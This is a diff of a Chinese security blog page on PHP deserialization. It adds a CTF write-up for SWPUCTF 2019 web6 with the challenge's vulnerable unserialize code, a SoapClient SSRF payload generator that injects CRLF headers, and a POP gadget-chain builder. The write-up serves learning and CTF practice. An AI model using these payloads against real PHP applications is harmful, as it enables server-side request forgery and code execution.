@@ -94,7 +94,9 @@
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/66320601-baf8c880-e951-11e9-8a3f-1bf39a2f08ed.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/66320574-a7e5f880-e951-11e9-9f5f-05bddd51af9b.png">
 <meta property="og:image" content="https://user-images.githubusercontent.com/40637063/66320472-78cf8700-e951-11e9-85b2-8f9b18fc9b9d.png">
-<meta property="og:updated_time" content="2019-10-07T14:29:01.407Z">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70534832-dae97a00-1b96-11ea-9edf-1ce93b617b9d.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/70534582-54349d00-1b96-11ea-9028-3d08bb6c72c2.png">
+<meta property="og:updated_time" content="2019-12-10T13:56:43.225Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="php的两类反序列化">
 <meta name="twitter:description" content="php中的反序列化分为两类: 一种是常规ctf题目中的直接传入并反序列化, 另一种和session有关: session反序列化漏洞 特征 phpinfo中默认的session.serialize_handler和本地的值不一样 ini_set(‘session.serialize_handler’, ‘php’);之类的 phpinfo中session.upload_progress.enabl">
@@ -169,7 +171,7 @@
       </a>
     </div>
       
-        <p class="site-subtitle">龙信仰总是能抓住战士们的心，或许是因为他们不求言语吧。</p>
+        <p class="site-subtitle">别浪费时间了,这里没什么值得你看的东西</p>
       
   </div>
 
@@ -338,8 +340,8 @@
               
                 <span class="post-meta-item-text">Post modified&#58;</span>
               
-              <time title="Post modified" itemprop="dateModified" datetime="2019-10-07T22:29:01+08:00">
-                2019-10-07
+              <time title="Post modified" itemprop="dateModified" datetime="2019-12-10T21:56:43+08:00">
+                2019-12-10
               </time>
             
           </span>
@@ -366,7 +368,7 @@
                   <span class="post-meta-item-text">Words count in article&#58;</span>
                 
                 <span title="Words count in article">
-                  1.2k
+                  1.5k
                 </span>
               
 
@@ -382,7 +384,7 @@
                   <span class="post-meta-item-text">Reading time &asymp;</span>
                 
                 <span title="Reading time">
-                  4
+                  6
                 </span>
               
             </div>
@@ -464,11 +466,26 @@
 <p><img src="https://user-images.githubusercontent.com/40637063/66320601-baf8c880-e951-11e9-8a3f-1bf39a2f08ed.png" alt="1570458197732"></p>
 <p><img src="https://user-images.githubusercontent.com/40637063/66320574-a7e5f880-e951-11e9-9f5f-05bddd51af9b.png" alt="1570458295931"></p>
 <p><img src="https://user-images.githubusercontent.com/40637063/66320472-78cf8700-e951-11e9-85b2-8f9b18fc9b9d.png" alt="image"></p>
+<h2 id="SWPUCTF-2019-web6"><a href="#SWPUCTF-2019-web6" class="headerlink" title="SWPUCTF 2019 web6"></a>SWPUCTF 2019 web6</h2><p>前面部分省略, 来到源码部分</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name,$param)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)</span><br><span class="line">                &#123;</span><br><span class="line">                    $s1 = <span class="keyword">$this</span>-&gt;&#123;$name&#125;;</span><br><span class="line">                    $s1();</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($ke)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;mod2[$ke];</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;mod1-&gt;test2();</span><br><span class="line">        &#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $mod1;</span><br><span class="line">        <span class="keyword">public</span> $mod2;</span><br><span class="line">        <span class="keyword">public</span> $mod3;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;mod2 = <span class="keyword">$this</span>-&gt;mod3.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">        &#125; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $str1;</span><br><span class="line">        <span class="keyword">public</span> $str2;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;str1-&gt;&#123;<span class="keyword">$this</span>-&gt;str2&#125;();</span><br><span class="line">                <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = $_POST[<span class="string">'aa'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>ssrf生成session反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>;</span><br><span class="line">$headers = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'X-Forwarded-For: 127.0.0.1'</span>,</span><br><span class="line">    <span class="string">'Cookie: user=xZmdm9NxaQ=='</span>,</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target, <span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span>=&gt;<span class="string">'aabb'</span>));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">'^^'</span>, <span class="string">"\r\n"</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> $a;</span><br><span class="line"><span class="comment">// echo urlencode($a);</span></span><br></pre></td></tr></table></figure>
+
+<p>序列化生成, 触发反序列化后进而触发session的反序列化</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$first = <span class="keyword">new</span> bb();</span><br><span class="line">$second = <span class="keyword">new</span> aa();</span><br><span class="line">$third = <span class="keyword">new</span> cc();</span><br><span class="line">$four = <span class="keyword">new</span> ee();</span><br><span class="line">$first -&gt;mod1 = $second;</span><br><span class="line">$third -&gt; mod1 = $four;</span><br><span class="line">$f = <span class="keyword">new</span> dd();</span><br><span class="line">$f-&gt;flag=<span class="string">'Get_flag'</span>;</span><br><span class="line">$f-&gt;b=<span class="string">'call_user_func'</span>;</span><br><span class="line">$four -&gt; str1 = $f;</span><br><span class="line">$four -&gt; str2 = <span class="string">"getflag"</span>;</span><br><span class="line">$second -&gt;mod2[<span class="string">'test2'</span>] = $third;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> serialize($first);</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>PHPSESSID随便指定写一个比如kk默认情况下会生成sess_kk session文件</p>
+</blockquote>
+<p><img src="https://user-images.githubusercontent.com/40637063/70534832-dae97a00-1b96-11ea-9edf-1ce93b617b9d.png" alt="image"></p>
+<p><img src="https://user-images.githubusercontent.com/40637063/70534582-54349d00-1b96-11ea-9028-3d08bb6c72c2.png" alt="image"></p>
 <p>参考</p>
 <p><a href="https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/" target="_blank" rel="noopener">https://www.smi1e.top/lctf2018-bestphps-revenge-%E8%AF%A6%E7%BB%86%E9%A2%98%E8%A7%A3/</a></p>
 <p> <a href="http://www.91ri.org15925.html" target="_blank" rel="noopener">http://www.91ri.org15925.html</a></p>
 <p><a href="https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO" target="_blank" rel="noopener">https://skysec.top/2017/08/16/jarvisoj-web/#PHPINFO</a></p>
 <p><a href="https://blog.spoock.com/2016/10/16/php-serialize-problem/" target="_blank" rel="noopener">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a></p>
+<p><a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a></p>
 
       
     </div>
@@ -584,7 +601,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">34</span>
+                  <span class="site-state-item-count">33</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -728,7 +745,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#session反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">session反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题LCTF2018-bestphp’s-revenge"><span class="nav-number">2.</span> <span class="nav-text">例题LCTF2018-bestphp’s revenge</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#session反序列化漏洞"><span class="nav-number">1.</span> <span class="nav-text">session反序列化漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#例题LCTF2018-bestphp’s-revenge"><span class="nav-number">2.</span> <span class="nav-text">例题LCTF2018-bestphp’s revenge</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SWPUCTF-2019-web6"><span class="nav-number">3.</span> <span class="nav-text">SWPUCTF 2019 web6</span></a></li></ol></div>
             
 
           </div>
